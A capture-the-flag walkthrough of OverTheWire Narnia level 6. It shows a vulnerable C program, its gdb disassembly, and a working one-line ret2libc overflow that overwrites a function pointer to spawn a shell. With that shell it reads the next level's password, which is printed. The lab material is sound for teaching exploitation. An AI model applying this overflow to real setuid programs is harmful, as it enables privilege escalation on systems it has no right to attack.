#### Narnia Level 5 → Level 6

```sh
➜  ~ ssh narnia6@narnia.labs.overthewire.org -p 2226
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
narnia6@narnia.labs.overthewire.org's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

narnia6@narnia:~$
```

```sh
narnia6@narnia:~$ cd /narnia/
narnia6@narnia:/narnia$ ll
total 116
drwxr-xr-x  2 root    root    4096 Nov  9 15:08 ./
drwxr-xr-x 25 root    root    4096 Nov 21 07:46 ../
-r-sr-x---  1 narnia1 narnia0 7568 Nov  9 15:08 narnia0*
-r--r-----  1 narnia0 narnia0 1186 Nov  9 15:08 narnia0.c
-r-sr-x---  1 narnia2 narnia1 7404 Nov  9 15:08 narnia1*
-r--r-----  1 narnia1 narnia1 1000 Nov  9 15:08 narnia1.c
-r-sr-x---  1 narnia3 narnia2 5164 Nov  9 15:08 narnia2*
-r--r-----  1 narnia2 narnia2  999 Nov  9 15:08 narnia2.c
-r-sr-x---  1 narnia4 narnia3 5836 Nov  9 15:08 narnia3*
-r--r-----  1 narnia3 narnia3 1841 Nov  9 15:08 narnia3.c
-r-sr-x---  1 narnia5 narnia4 5336 Nov  9 15:08 narnia4*
-r--r-----  1 narnia4 narnia4 1064 Nov  9 15:08 narnia4.c
-r-sr-x---  1 narnia6 narnia5 5700 Nov  9 15:08 narnia5*
-r--r-----  1 narnia5 narnia5 1261 Nov  9 15:08 narnia5.c
-r-sr-x---  1 narnia7 narnia6 6076 Nov  9 15:08 narnia6*
-r--r-----  1 narnia6 narnia6 1602 Nov  9 15:08 narnia6.c
-r-sr-x---  1 narnia8 narnia7 6676 Nov  9 15:08 narnia7*
-r--r-----  1 narnia7 narnia7 1974 Nov  9 15:08 narnia7.c
-r-sr-x---  1 narnia9 narnia8 5232 Nov  9 15:08 narnia8*
-r--r-----  1 narnia8 narnia8 1292 Nov  9 15:08 narnia8.c
narnia6@narnia:/narnia$
```

```sh
narnia6@narnia:/narnia$ cat narnia6.c
```

```c
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
	char b1[8], b2[8];
	int  (*fp)(char *)=(int(*)(char *))&puts, i;

	if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

	/* clear environ */
	for(i=0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));
	/* clear argz    */
	for(i=3; argv[i] != NULL; i++)
		memset(argv[i], '\0', strlen(argv[i]));

	strcpy(b1,argv[1]);
	strcpy(b2,argv[2]);
	//if(((unsigned long)fp & 0xff000000) == 0xff000000)
	if(((unsigned long)fp & 0xff000000) == get_sp())
		exit(-1);
	setreuid(geteuid(),geteuid());
    fp(b1);

	exit(1);
}
```

```sh
narnia6@narnia:/narnia$ ./narnia6
./narnia6 b1 b2
narnia6@narnia:/narnia$
```

```sh
narnia6@narnia:/narnia$ ./narnia6 AAA BBB
AAA
narnia6@narnia:/narnia$ ./narnia6 A B
A
narnia6@narnia:/narnia$
```

```sh
narnia6@narnia:/narnia$ gdb ./narnia6 -q
Reading symbols from ./narnia6...(no debugging symbols found)...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x080485a9 <+0>:	push   %ebp
   0x080485aa <+1>:	mov    %esp,%ebp
   0x080485ac <+3>:	push   %ebx
   0x080485ad <+4>:	and    $0xfffffff0,%esp
   0x080485b0 <+7>:	sub    $0x30,%esp
   0x080485b3 <+10>:	movl   $0x8048430,0x28(%esp)
   0x080485bb <+18>:	cmpl   $0x3,0x8(%ebp)
   0x080485bf <+22>:	je     0x80485e2 <main+57>
   0x080485c1 <+24>:	mov    0xc(%ebp),%eax
   0x080485c4 <+27>:	mov    (%eax),%eax
   0x080485c6 <+29>:	mov    %eax,0x4(%esp)
   0x080485ca <+33>:	movl   $0x80487b0,(%esp)
   0x080485d1 <+40>:	call   0x8048400 <printf@plt>
   0x080485d6 <+45>:	movl   $0xffffffff,(%esp)
   0x080485dd <+52>:	call   0x8048440 <exit@plt>
   0x080485e2 <+57>:	movl   $0x0,0x2c(%esp)
   0x080485ea <+65>:	jmp    0x804862e <main+133>
   0x080485ec <+67>:	mov    0x80499fc,%eax
   0x080485f1 <+72>:	mov    0x2c(%esp),%edx
   0x080485f5 <+76>:	shl    $0x2,%edx
   0x080485f8 <+79>:	add    %edx,%eax
   0x080485fa <+81>:	mov    (%eax),%eax
   0x080485fc <+83>:	mov    %eax,(%esp)
   0x080485ff <+86>:	call   0x8048460 <strlen@plt>
   0x08048604 <+91>:	mov    0x80499fc,%edx
   0x0804860a <+97>:	mov    0x2c(%esp),%ecx
   0x0804860e <+101>:	shl    $0x2,%ecx
   0x08048611 <+104>:	add    %ecx,%edx
   0x08048613 <+106>:	mov    (%edx),%edx
   0x08048615 <+108>:	mov    %eax,0x8(%esp)
   0x08048619 <+112>:	movl   $0x0,0x4(%esp)
   0x08048621 <+120>:	mov    %edx,(%esp)
   0x08048624 <+123>:	call   0x8048480 <memset@plt>
   0x08048629 <+128>:	addl   $0x1,0x2c(%esp)
   0x0804862e <+133>:	mov    0x80499fc,%eax
   0x08048633 <+138>:	mov    0x2c(%esp),%edx
   0x08048637 <+142>:	shl    $0x2,%edx
   0x0804863a <+145>:	add    %edx,%eax
   0x0804863c <+147>:	mov    (%eax),%eax
   0x0804863e <+149>:	test   %eax,%eax
   0x08048640 <+151>:	jne    0x80485ec <main+67>
   0x08048642 <+153>:	movl   $0x3,0x2c(%esp)
   0x0804864a <+161>:	jmp    0x8048691 <main+232>
   0x0804864c <+163>:	mov    0x2c(%esp),%eax
   0x08048650 <+167>:	lea    0x0(,%eax,4),%edx
   0x08048657 <+174>:	mov    0xc(%ebp),%eax
   0x0804865a <+177>:	add    %edx,%eax
   0x0804865c <+179>:	mov    (%eax),%eax
   0x0804865e <+181>:	mov    %eax,(%esp)
---Type <return> to continue, or q <return> to quit---
   0x08048661 <+184>:	call   0x8048460 <strlen@plt>
   0x08048666 <+189>:	mov    0x2c(%esp),%edx
   0x0804866a <+193>:	lea    0x0(,%edx,4),%ecx
   0x08048671 <+200>:	mov    0xc(%ebp),%edx
   0x08048674 <+203>:	add    %ecx,%edx
   0x08048676 <+205>:	mov    (%edx),%edx
   0x08048678 <+207>:	mov    %eax,0x8(%esp)
   0x0804867c <+211>:	movl   $0x0,0x4(%esp)
   0x08048684 <+219>:	mov    %edx,(%esp)
   0x08048687 <+222>:	call   0x8048480 <memset@plt>
   0x0804868c <+227>:	addl   $0x1,0x2c(%esp)
   0x08048691 <+232>:	mov    0x2c(%esp),%eax
   0x08048695 <+236>:	lea    0x0(,%eax,4),%edx
   0x0804869c <+243>:	mov    0xc(%ebp),%eax
   0x0804869f <+246>:	add    %edx,%eax
   0x080486a1 <+248>:	mov    (%eax),%eax
   0x080486a3 <+250>:	test   %eax,%eax
   0x080486a5 <+252>:	jne    0x804864c <main+163>
   0x080486a7 <+254>:	mov    0xc(%ebp),%eax
   0x080486aa <+257>:	add    $0x4,%eax
   0x080486ad <+260>:	mov    (%eax),%eax
   0x080486af <+262>:	mov    %eax,0x4(%esp)
   0x080486b3 <+266>:	lea    0x20(%esp),%eax
   0x080486b7 <+270>:	mov    %eax,(%esp)
   0x080486ba <+273>:	call   0x8048420 <strcpy@plt>
   0x080486bf <+278>:	mov    0xc(%ebp),%eax
   0x080486c2 <+281>:	add    $0x8,%eax
   0x080486c5 <+284>:	mov    (%eax),%eax
   0x080486c7 <+286>:	mov    %eax,0x4(%esp)
   0x080486cb <+290>:	lea    0x18(%esp),%eax
   0x080486cf <+294>:	mov    %eax,(%esp)
   0x080486d2 <+297>:	call   0x8048420 <strcpy@plt>
   0x080486d7 <+302>:	mov    0x28(%esp),%eax
   0x080486db <+306>:	and    $0xff000000,%eax
   0x080486e0 <+311>:	mov    %eax,%ebx
   0x080486e2 <+313>:	call   0x804859d <get_sp>
   0x080486e7 <+318>:	cmp    %eax,%ebx
   0x080486e9 <+320>:	jne    0x80486f7 <main+334>
   0x080486eb <+322>:	movl   $0xffffffff,(%esp)
   0x080486f2 <+329>:	call   0x8048440 <exit@plt>
   0x080486f7 <+334>:	call   0x8048410 <geteuid@plt>
   0x080486fc <+339>:	mov    %eax,%ebx
   0x080486fe <+341>:	call   0x8048410 <geteuid@plt>
   0x08048703 <+346>:	mov    %ebx,0x4(%esp)
   0x08048707 <+350>:	mov    %eax,(%esp)
   0x0804870a <+353>:	call   0x8048450 <setreuid@plt>
   0x0804870f <+358>:	lea    0x20(%esp),%eax
   0x08048713 <+362>:	mov    %eax,(%esp)
   0x08048716 <+365>:	mov    0x28(%esp),%eax
   0x0804871a <+369>:	call   *%eax
---Type <return> to continue, or q <return> to quit---
   0x0804871c <+371>:	movl   $0x1,(%esp)
   0x08048723 <+378>:	call   0x8048440 <exit@plt>
End of assembler dump.
(gdb)
```

```sh
narnia6@narnia:/narnia$ gdb -q narnia6
Reading symbols from narnia6...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x80485ad
(gdb) r
Starting program: /narnia/narnia6

Breakpoint 1, 0x080485ad in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e51940 <system>
(gdb) quit
A debugging session is active.

	Inferior 1 [process 16502] will be killed.

Quit anyway? (y or n) y
narnia6@narnia:/narnia$
```

```sh
narnia6@narnia:/narnia$ ./narnia6 $(python -c 'print "sh;#" + "A"*4 + "\x40\x19\xe5\xf7"' ) B
$ id
uid=14007(narnia7) gid=14006(narnia6) groups=14006(narnia6)
$ cat /etc/narnia_pass/narnia7
ahkiaziphu
$
narnia6@narnia:/narnia$
```

[``Solution``](https://www.lukeaddison.co.uk/blog/narnia-level-6/)